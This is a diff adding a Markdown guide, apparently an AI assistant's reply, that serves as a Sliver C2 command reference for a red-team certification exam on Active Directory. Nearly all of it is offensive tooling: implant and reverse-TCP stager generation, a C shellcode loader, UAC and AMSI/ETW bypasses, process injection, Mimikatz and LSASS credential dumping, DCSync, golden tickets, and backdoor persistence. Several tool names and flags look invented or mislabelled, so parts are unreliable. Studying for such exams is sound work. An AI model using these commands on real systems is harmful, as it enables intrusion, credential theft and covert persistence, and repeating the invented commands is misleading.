@@ -1,0 +1,827 @@
+Here is the **complete, all-in-one Sliver C2 Mastery Guide** in a single Markdown file. It includes every phase, every command, and every technique you need for the CRTeamer exam, all in one easy-to-reference document.
+
+```markdown
+#  Sliver C2 Mastery Guide – Complete Reference
+
+**Version:** 2.0  
+**Target:** CRTeamer Exam & Active Directory Lab  
+**Focus:** Complete Sliver workflow from initial access to domain dominance
+
+---
+
+##  Table of Contents
+
+1. [Core Concepts](#core-concepts)
+2. [Setup & Installation](#setup--installation)
+3. [Payload Generation & Staging](#payload-generation--staging)
+4. [Phase 1: Enumeration & Reconnaissance](#phase-1-enumeration--reconnaissance)
+5. [Phase 2: Post-Exploitation & In-Memory Execution](#phase-2-post-exploitation--in-memory-execution)
+6. [Phase 3: Privilege Escalation](#phase-3-privilege-escalation)
+7. [Phase 4: Lateral Movement & Pivoting](#phase-4-lateral-movement--pivoting)
+8. [Phase 5: Credential Access & Domain Dominance](#phase-5-credential-access--domain-dominance)
+9. [Phase 6: Persistence](#phase-6-persistence)
+10. [Phase 7: Evasion (Defender Bypass)](#phase-7-evasion-defender-bypass)
+11. [Troubleshooting Guide](#troubleshooting-guide)
+12. [Exam Strategy & Time Management](#exam-strategy--time-management)
+13. [Quick Command Reference](#quick-command-reference)
+14. [Armory Installation](#armory-installation)
+15. [Your AD Lab Practice Plan](#your-ad-lab-practice-plan)
+
+---
+
+## 🧠 Core Concepts
+
+### Beacon vs Session
+| Mode | Description | When to Use |
+|------|-------------|-------------|
+| **Beacon** | Periodic check-ins (stealthy) | Default mode for persistence |
+| **Session** | Real-time interactive connection | For interactive commands (e.g., `socks5`, `portfwd`) |
+
+**Convert beacon to session:** `interactive`
+
+### Staged vs Stageless
+| Type | Description | File Size |
+|------|-------------|-----------|
+| **Staged** | Small stager downloads full payload | ~5-10 KB |
+| **Stageless** | Full payload in one file | ~10-20 MB |
+
+**Exam Recommendation:** Use staged payloads to keep initial footprint small.
+
+---
+
+##  Setup & Installation
+
+### Server Setup (Kali/Linux)
+```bash
+# One-liner installation
+curl https://sliver.sh/install | sudo bash
+sudo systemctl start sliver.service
+sliver
+
+# Or manual start
+sliver-server
+```
+
+### Client Connection (Optional)
+```bash
+# Generate client config
+sliver > new-operator --name YOUR_NAME --lhost 127.0.0.1
+
+# Connect client
+sliver-client
+```
+
+### Verify Installation
+```text
+sliver > version
+sliver > help
+```
+
+---
+
+##  Payload Generation & Staging
+
+### Step 1: Create a Profile
+```text
+# Stageless profile (full implant)
+profiles new --mtls 172.16.38.137:8888 --format shellcode win64_mtls
+
+# Beacon profile (stealthy)
+profiles new --mtls 172.16.38.137:8888 --format shellcode --beacon 60 win64_beacon
+
+# HTTP profile
+profiles new --http 172.16.38.137:8080 --format shellcode win64_http
+```
+
+### Step 2: Start Stage-Listener
+```text
+# TCP staging
+stage-listener --url tcp://172.16.38.137:8443 --profile win64_mtls
+
+# HTTP staging
+stage-listener --url http://172.16.38.137:8080 --profile win64_http
+
+# With encryption
+stage-listener --url http://172.16.38.137:8080 --profile win64_mtls --aes-encrypt-key MyKey1234 --aes-encrypt-iv 1234567890123456
+```
+
+### Step 3: Start Callback Listener
+```text
+# mTLS listener
+mtls --lhost 172.16.38.137 --lport 8888
+
+# HTTP listener
+http --lhost 172.16.38.137 --lport 8080
+
+# HTTPS listener
+https --lhost 172.16.38.137 --lport 443
+
+# DNS listener
+dns --lhost 172.16.38.137 --domains example.com
+```
+
+### Step 4: Generate Implant
+```text
+# Stageless EXE
+generate --mtls 172.16.38.137:8888 --format exe --save /path/to/implant.exe
+
+# Stageless DLL
+generate --mtls 172.16.38.137:8888 --format shared --save /path/to/implant.dll
+
+# Shellcode (for custom loader)
+generate --mtls 172.16.38.137:8888 --format shellcode --save /path/to/shellcode.bin
+```
+
+### Step 5: Generate Stager
+```text
+# Using Sliver (requires msfvenom)
+generate stager --lhost 172.16.38.137 --lport 8443 --protocol tcp --format c --save /path/to/stager.c
+
+# Using msfvenom directly (recommended)
+msfvenom -p windows/x64/custom/reverse_tcp LHOST=172.16.38.137 LPORT=8443 --format c -o /path/to/stager.c
+
+# PowerShell stager
+msfvenom -p windows/x64/custom/reverse_tcp LHOST=172.16.38.137 LPORT=8443 --format psh -o /path/to/stager.ps1
+```
+
+### Step 6: Basic C Loader for Shellcode
+```c
+#include <windows.h>
+
+int main() {
+    unsigned char buf[] = {
+        // Paste shellcode here (from xxd -i)
+    };
+    
+    SIZE_T size = sizeof(buf);
+    LPVOID addr = VirtualAlloc(NULL, size, 0x00001000, 0x40);
+    RtlMoveMemory(addr, buf, size);
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
+    WaitForSingleObject(hThread, 0xFFFFFFFF);
+    return 0;
+}
+```
+
+```bash
+# Compile on Kali
+x86_64-w64-mingw32-gcc -o loader.exe loader.c -s -ffunction-sections -fdata-sections -Wl,--gc-sections
+```
+
+---
+
+##  Phase 1: Enumeration & Reconnaissance
+
+### Manual Commands
+```text
+# User & Group Info
+whoami
+net user
+net user /domain
+net group "Domain Admins" /domain
+net localgroup Administrators
+
+# Network Info
+ipconfig /all
+netstat -ano
+route print
+arp -a
+
+# System Info
+systeminfo
+tasklist /v
+wmic qfe list brief  # Patches
+wmic os get caption,version,csname
+```
+
+### In-Memory Recon Tools
+```text
+# Seatbelt - Complete system enumeration
+execute-assembly Seatbelt -group=system
+execute-assembly Seatbelt -group=user
+execute-assembly Seatbelt -group=network
+execute-assembly Seatbelt -group=all
+
+# SharpHound - AD mapping for BloodHound
+execute-assembly SharpHound -c All --outputdirectory C:\Windows\Temp\
+
+# SharpView - Alternative AD recon
+execute-assembly SharpView Get-DomainUser -Properties samaccountname,lastlogon
+execute-assembly SharpView Get-DomainComputer -Properties dnsname,operatingsystem
+execute-assembly SharpView Get-DomainGroup -Properties cn,description
+execute-assembly SharpView Get-DomainGroupMember -Identity "Domain Admins"
+
+# ADSI - Quick AD queries
+execute-assembly ADSI "(&(objectCategory=person)(objectClass=user))"
+execute-assembly ADSI "(&(objectCategory=computer)(operatingsystem=*Server*))"
+```
+
+### Situational Awareness (BOFs)
+```text
+# SA BOFs (lighter than .NET tools)
+sa-whoami
+sa-netuser
+sa-netgroup
+sa-ipconfig
+sa-netstat
+sa-tasklist
+sa-netview
+sa-netlocalgroup
+sa-netshares
+sa-sc-enum
+sa-schtasksenum
+sa-ldapsearch
+```
+
+---
+
+##  Phase 2: Post-Exploitation & In-Memory Execution
+
+### Install Armory (One-Time)
+```text
+armory update
+armory install .net-recon
+armory install kerberos
+armory install windows-credentials
+armory install windows-pivot
+armory install windows-bypass
+```
+
+### Execute .NET Tools
+```text
+# Basic syntax
+execute-assembly /path/to/tool.exe "arguments"
+
+# Examples with output redirection
+execute-assembly C:\Tools\Rubeus.exe "kerberoast" > C:\Windows\Temp\output.txt
+
+# With runtime version
+execute-assembly --runtime v4.0.30319 /path/to/tool.exe "args"
+```
+
+### File System Operations
+```text
+# Browse files
+ls C:\Windows\Temp\
+ls C:\Users\Administrator\Desktop\
+
+# Upload/download
+upload /local/payload.exe C:\Windows\Temp\payload.exe
+download C:\Windows\Temp\sensitive.txt /home/kali/
+
+# Create/delete
+mkdir C:\Windows\Temp\Staging
+rm C:\Windows\Temp\payload.exe
+```
+
+### Process Management
+```text
+# List processes
+ps
+
+# Kill a process
+kill 1234
+
+# Migrate to another process (avoid detection)
+migrate 5678
+
+# Run as another user
+runas --username DOMAIN\user --password Pass123 --command "whoami"
+```
+
+---
+
+##  Phase 3: Privilege Escalation
+
+### Local Privilege Escalation
+```text
+# 1. Enumerate vulnerabilities
+execute-assembly SharpUp
+
+# 2. Unquoted Service Paths
+execute-assembly SharpUp "UnquotedServicePaths"
+
+# 3. AlwaysInstallElevated
+execute-assembly SharpUp "AlwaysInstallElevated"
+
+# 4. Modifiable Services
+execute-assembly SharpUp "ModifiableServices"
+
+# 5. Registry Misconfigurations
+execute-assembly SharpUp "ModifiableRegistry"
+
+# 6. DLL Hijacking
+execute-assembly SharpUp "DLLHijacking"
+```
+
+### UAC Bypass Methods
+```text
+# Eventvwr bypass
+execute-assembly UAC-Bypass -method eventvwr -command "C:\Windows\Temp\implant.exe"
+
+# Fodhelper bypass
+execute-assembly UAC-Bypass -method fodhelper -command "C:\Windows\Temp\implant.exe"
+
+# SilentCleanup bypass
+execute-assembly UAC-Bypass -method silentcleanup -command "C:\Windows\Temp\implant.exe"
+
+# CMSTP bypass
+execute-assembly UAC-Bypass -method cmstp -command "C:\Windows\Temp\implant.exe"
+```
+
+### Domain Privilege Escalation
+```text
+# 1. Kerberoast (find SPN accounts)
+execute-assembly Rubeus kerberoast
+
+# 2. AS-REP Roasting
+execute-assembly Rubeus asreproast
+
+# 3. Check for delegation
+execute-assembly Rubeus "delegation /target:domaincontroller"
+
+# 4. ACL misconfigurations
+execute-assembly SharpView Get-DomainObjectAcl -ResolveGUIDs
+
+# 5. Check for DCSync rights
+execute-assembly SharpView Get-DomainObjectAcl -Identity "DC=DOMAIN,DC=com" -ResolveGUIDs
+
+# 6. Check for GPO misconfigurations
+execute-assembly SharpView Get-DomainGPO -Properties displayname,description
+```
+
+### BloodHound Attack Paths
+```text
+# 1. Run SharpHound
+execute-assembly SharpHound -c All --outputdirectory C:\Windows\Temp\
+
+# 2. Download results
+download C:\Windows\Temp\*.zip /home/kali/bloodhound/
+
+# 3. Analyze in BloodHound (on Kali)
+bloodhound --no-sandbox
+```
+
+---
+
+##  Phase 4: Lateral Movement & Pivoting
+
+### Lateral Movement Tools
+```text
+# SharpSMBExec (PsExec style)
+execute-assembly SharpSMBExec -username DOMAIN\user -password Pass123 -computer TARGET -command "whoami"
+
+# SharpWMI (WMI execution)
+execute-assembly SharpWMI -method execute -computer TARGET -command "whoami" -output C:\Windows\Temp\out.txt
+
+# SharpRDP (WinRM)
+execute-assembly SharpRDP -method execute -computer TARGET -command "whoami"
+
+# SharpTask (Scheduled Task)
+execute-assembly SharpTask -computer TARGET -create -taskname "Update" -command "whoami" -time "2025-12-31T23:59"
+
+# SharpSCCM (SCCM abuse)
+execute-assembly SharpSCCM -method execute -computer TARGET -command "whoami"
+
+# WinRM (built-in)
+winrm --target TARGET --username DOMAIN\user --password Pass123 --command "whoami"
+```
+
+### Pivoting Techniques
+```text
+# SOCKS5 Proxy (access internal networks)
+socks5 start
+# Then on Kali:
+proxychains nmap -sT -Pn -p 445 10.10.20.0/24
+proxychains crackmapexec smb 10.10.20.0/24 -u user -p pass
+
+# Port Forwarding
+portfwd add --bind 127.0.0.1:3389 --remote TARGET:3389
+portfwd add --bind 127.0.0.1:445 --remote TARGET:445
+
+# Reverse Port Forward
+portfwd add --bind TARGET:8080 --remote 127.0.0.1:8080
+
+# Chisel (Fast TCP Tunnel)
+chisel server --port 8080 --socks5
+# On Kali:
+chisel client 172.16.38.137:8080 socks
+```
+
+### TCP Pivot (Native Sliver)
+```text
+# Create TCP pivot listener on target
+tcp-pivot --lhost 0.0.0.0 --lport 4444
+
+# Connect from another machine
+generate stager --tcp-pivot TARGET:4444 --format exe --save /path/to/pivot.exe
+```
+
+---
+
+##  Phase 5: Credential Access & Domain Dominance
+
+### Credential Dumping
+```text
+# 1. Nanodump (BOF - lightweight)
+nanodump
+
+# 2. Mimikatz (execute-assembly)
+execute-assembly Mimikatz "privilege::debug sekurlsa::logonpasswords"
+execute-assembly Mimikatz "privilege::debug sekurlsa::ekeys"
+execute-assembly Mimikatz "privilege::debug sekurlsa::tickets"
+execute-assembly Mimikatz "privilege::debug lsadump::sam"
+execute-assembly Mimikatz "privilege::debug lsadump::secrets"
+
+# 3. Dump SAM via registry
+registry get --hive HKLM --path "SAM\SAM\Domains\Account\Users\Names" --recursive
+
+# 4. Dump LSASS via Procdump
+run procdump -ma lsass.exe C:\Windows\Temp\lsass.dmp
+
+# 5. SharpSeckdump (Impala's secretsdump in C#)
+execute-assembly SharpSeckdump -computername TARGET -username DOMAIN\user -password Pass123
+```
+
+### Kerberos Attacks
+```text
+# 1. Kerberoast
+execute-assembly Rubeus kerberoast
+
+# 2. AS-REP Roasting
+execute-assembly Rubeus asreproast /format:hashcat
+
+# 3. Overpass-the-Hash
+execute-assembly Rubeus "asktgt /user:admin /rc4:<ntlm_hash>"
+
+# 4. Pass-the-Ticket
+execute-assembly Rubeus "createnetonly /program:C:\Windows\System32\cmd.exe /domain:DOMAIN /username:admin /password:Pass123"
+
+# 5. S4U2Self (for RBCD)
+execute-assembly Rubeus "s4u /user:webservice /impersonateuser:administrator /msdsspn:cifs/TARGET"
+
+# 6. S4U2Proxy (for delegation)
+execute-assembly Rubeus "s4u /user:webservice /impersonateuser:administrator /msdsspn:cifs/TARGET /altservice:ldap"
+```
+
+### Golden & Silver Tickets
+```text
+# Golden Ticket (requires KRBTGT hash)
+execute-assembly Mimikatz "kerberos::golden /domain:DOMAIN /sid:S-1-5-21-123456789 /krbtgt:hash /user:administrator /ticket:ticket.kirbi"
+
+# Silver Ticket (requires service NTLM hash)
+execute-assembly Mimikatz "kerberos::golden /domain:DOMAIN /sid:S-1-5-21-123456789 /target:TARGET /service:cifs /rc4:hash /user:administrator /ptt"
+```
+
+### DCSync Attack
+```text
+# 1. Using Mimikatz
+execute-assembly Mimikatz "lsadump::dcsync /domain:DOMAIN /user:krbtgt"
+
+# 2. Using SharpSeckdump
+execute-assembly SharpSeckdump -method dcsync -user krbtgt
+
+# 3. Using Rubeus
+execute-assembly Rubeus "dcsync /user:krbtgt"
+```
+
+---
+
+##  Phase 6: Persistence
+
+### Host-Based Persistence
+```text
+# 1. Scheduled Task
+schedule task create /tn "Update" /tr "C:\Windows\Temp\implant.exe" /sc once /sd "2025-12-31T23:59:00"
+
+# 2. Registry Run Key (User)
+registry set --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "Update" --value "C:\Windows\Temp\implant.exe"
+
+# 3. Registry Run Key (System)
+registry set --hive HKLM --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "Update" --value "C:\Windows\Temp\implant.exe"
+
+# 4. Service Creation
+sc create "UpdateService" binPath= "C:\Windows\Temp\implant.exe" start= auto
+
+# 5. WMI Event Subscription
+execute-assembly WMI-Persistence -method create -filter "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'" -consumer "C:\Windows\Temp\implant.exe"
+
+# 6. Startup Folder
+upload /local/implant.exe "C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\implant.exe"
+```
+
+### Domain-Based Persistence
+```text
+# 1. Add user to Domain Admins
+execute-assembly SharpView Add-DomainGroupMember -Identity "Domain Admins" -Members "backdoor_user"
+
+# 2. Create Computer Object
+execute-assembly SharpView New-DomainComputer -ComputerName "FAKE_PC" -Password "Pass123"
+
+# 3. AdminSDHolder (backdoor)
+execute-assembly SharpView Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=com" -PrincipalIdentity "backdoor_user" -Rights All
+
+# 4. SID History (requires DA)
+execute-assembly Mimikatz "sid::patch"
+execute-assembly Mimikatz "sid::add /user:backdoor_user /sid:S-1-5-21-123456789-500"
+
+# 5. DCSync Rights
+execute-assembly SharpView Add-DomainObjectAcl -TargetIdentity "DC=DOMAIN,DC=com" -PrincipalIdentity "backdoor_user" -Rights DCSync
+
+# 6. Create GPO (if DA)
+execute-assembly SharpView New-GPO -Name "Backdoor Policy" -DisplayName "Backdoor Policy"
+```
+
+---
+
+##  Phase 7: Evasion (Defender Bypass)
+
+### AMSI/ETW Bypass
+```text
+# 1. Inject AMSI Bypass into remote process
+inject-amsi-bypass --pid 1234
+
+# 2. Inject ETW Bypass
+inject-etw-bypass --pid 1234
+
+# 3. Patch AMSI/ETW in current process
+patchit --amsi --etw
+
+# 4. Using execute-assembly with AMSI bypass
+execute-assembly --amsi-bypass /path/to/tool.exe "args"
+```
+
+### Shellcode Injection Techniques
+```text
+# 1. Process Hollowing
+hollow --process notepad.exe --shellcode /path/to/shellcode.bin
+
+# 2. EarlyBird Injection
+inject-ntcreatethread --pid 1234 --shellcode /path/to/shellcode.bin
+
+# 3. APC Injection
+inject-ntqueueapcthread --pid 1234 --shellcode /path/to/shellcode.bin
+
+# 4. Section Mapping
+secinject --pid 1234 --shellcode /path/to/shellcode.bin
+
+# 5. Threadless Injection
+threadless-inject --pid 1234 --shellcode /path/to/shellcode.bin
+
+# 6. Syscall Injection
+syscalls_shinject --pid 1234 --shellcode /path/to/shellcode.bin
+```
+
+### Sleep Obfuscation
+```text
+# Add random sleep to avoid sandbox detection
+generate --mtls 172.16.38.137:8888 --reconnect 60 --max-errors 1000 --save /path/to/implant.exe
+
+# In loader
+Sleep(5000); // Wait 5 seconds before execution
+```
+
+### Traffic Obfuscation
+```text
+# Custom C2 Profile
+c2profiles generate --name stealth --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+```
+
+### Binary Obfuscation
+```text
+# Enable symbol obfuscation
+generate --mtls 172.16.38.137:8888 --skip-symbols false --save /path/to/implant.exe
+
+# Use external builders
+generate --mtls 172.16.38.137:8888 --external-builder --save /path/to/implant.exe
+```
+
+---
+
+## 🛠️ Troubleshooting Guide
+
+### Issue: execute-assembly fails with .NET errors
+```text
+# Try specifying the runtime version
+execute-assembly --runtime v4.0.30319 /path/to/tool.exe "args"
+
+# Or use BOF versions
+armory install nanodump
+nanodump
+```
+
+### Issue: Beacon stops checking in
+```text
+# Check listener status
+jobs
+
+# Restart listener if needed
+mtls --lhost IP --lport PORT
+
+# Check implant's connection strategy
+profiles
+```
+
+### Issue: Can't pivot to internal network
+```text
+# Ensure socks5 proxy is running
+socks5 start
+
+# Test with nmap through proxy
+proxychains nmap -sT -Pn -p 445 10.10.20.0/24
+
+# Check route
+route print
+```
+
+### Issue: File upload fails
+```text
+# Try chunked upload
+upload --chunk-size 102400 /local/path /remote/path
+
+# Try alternative location
+upload /local/path C:\Windows\Temp\file.exe
+```
+
+### Issue: Armory installation fails
+```text
+# Update armory index
+armory update
+
+# Install specific version
+armory install seatbelt@v0.0.6
+
+# Manual installation
+git clone https://github.com/sliverarmory/seatbelt ~/.sliver-client/aliases/
+```
+
+---
+
+##  Exam Strategy & Time Management
+
+### 5-Hour CRTeamer Exam Plan
+
+**Phase 1: Initial Access (30-45 min)**
+```text
+1. Set up Sliver server (pre-configured)
+2. Start listeners (stage-listener + mtls)
+3. Deploy stager
+4. Get beacon callback
+```
+
+**Phase 2: Reconnaissance (45-60 min)**
+```text
+1. Run Seatbelt (system enumeration)
+2. Run SharpHound (AD mapping)
+3. Download and analyze BloodHound data
+4. Identify attack paths
+```
+
+**Phase 3: Privilege Escalation (60-90 min)**
+```text
+1. Kerberoast (find SPN accounts)
+2. AS-REP Roasting
+3. Check ACL misconfigurations
+4. Escalate to DA or SYSTEM
+```
+
+**Phase 4: Lateral Movement (60-90 min)**
+```text
+1. Identify other machines
+2. Pivot using WMI/PsExec/WinRM
+3. Get beacons on other machines
+4. Collect additional flags
+```
+
+**Phase 5: Domain Dominance & Persistence (30-60 min)**
+```text
+1. Dump credentials (Mimikatz/Nanodump)
+2. Golden/Silver Ticket
+3. Set up persistence
+4. Collect final flags
+```
+
+### Quick Pivoting Strategy
+```text
+# If stuck for >15 minutes on a technique:
+1. Re-enumerate (run Seatbelt/SharpHound again)
+2. Try a different attack path (BloodHound shows alternatives)
+3. Move to a different machine
+4. Use a different tool (if Rubeus fails, try Mimikatz)
+```
+
+### Must-Have Commands Ready
+```text
+# Pre-copy these commands into your cheat sheet:
+profiles new --mtls IP:PORT --format shellcode --beacon 60 PROFILE
+stage-listener --url tcp://IP:PORT --profile PROFILE
+mtls --lhost IP --lport PORT
+generate stager --lhost IP --lport PORT --protocol tcp --format exe --save /path/
+execute-assembly Seatbelt -group=system
+execute-assembly SharpHound -c All
+execute-assembly Rubeus kerberoast
+socks5 start
+```
+
+---
+
+##  Quick Command Reference
+
+### Sliver Basics
+```text
+jobs                                 # List running listeners
+sessions / beacons                   # List active implants
+use <ID>                             # Interact with a session/beacon
+interactive                          # Convert beacon to session
+exit                                 # Exit current session
+```
+
+### Implant Generation
+```text
+profiles new --mtls IP:PORT --format shellcode --beacon 60 PROFILE
+stage-listener --url tcp://IP:PORT --profile PROFILE
+mtls --lhost IP --lport PORT
+generate stager --lhost IP --lport PORT --protocol tcp --format exe --save /path/
+generate --mtls IP:PORT --format shellcode --save /path/
+```
+
+### Execution
+```text
+execute-assembly /path/to/tool.exe "args"
+execute-shellcode -f /path/to/shellcode.bin
+run /path/to/executable.exe "args"
+```
+
+### File System
+```text
+ls /path/
+upload /local/path /remote/path
+download /remote/path /local/path
+rm /path/to/file
+mkdir /path/to/dir
+```
+
+### Pivoting
+```text
+socks5 start
+portfwd add --bind 127.0.0.1:8080 --remote TARGET:80
+```
+
+### Process Management
+```text
+ps                                 # List processes
+kill <PID>                         # Kill a process
+migrate <PID>                      # Migrate to another process
+```
+
+### Registry
+```text
+registry get --hive HKLM --path "Software\Microsoft\Windows\CurrentVersion\Run"
+registry set --hive HKLM --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "Update" --value "C:\path.exe"
+```
+
+### Scheduled Tasks
+```text
+schedule task create /tn "Update" /tr "C:\path.exe" /sc once /sd "2025-12-31T23:59:00"
+schedule task list
+schedule task delete /tn "Update"
+```
+
+---
+
+## Armory Installation
+
+```text
+# Update the armory index
+armory update
+
+# Install essential bundles
+armory install .net-recon      # Seatbelt, SharpHound, SharpView
+armory install kerberos        # Rubeus, Kerberoast tools
+armory install windows-credentials  # Nanodump, Mimikatz
+armory install windows-pivot   # Lateral movement tools
+armory install windows-bypass  # AMSI/ETW bypass tools
+
+# Install individual tools
+armory install seatbelt
+armory install rubeus
+armory install certify
+armory install sharp-hound-4
+armory install nanodump
+armory install sharpup
+armory install sharpview
+armory install chisel
+
+# View all available packages
+armory list
+
+# View installed packages
+armory list --installed
+```
+
+---
+
+*This is the complete Sliver C2 reference for the CRTeamer exam. Practice each phase, master the workflow, and you'll be ready.*
+
+**You've got this! 🎯**
+```
+
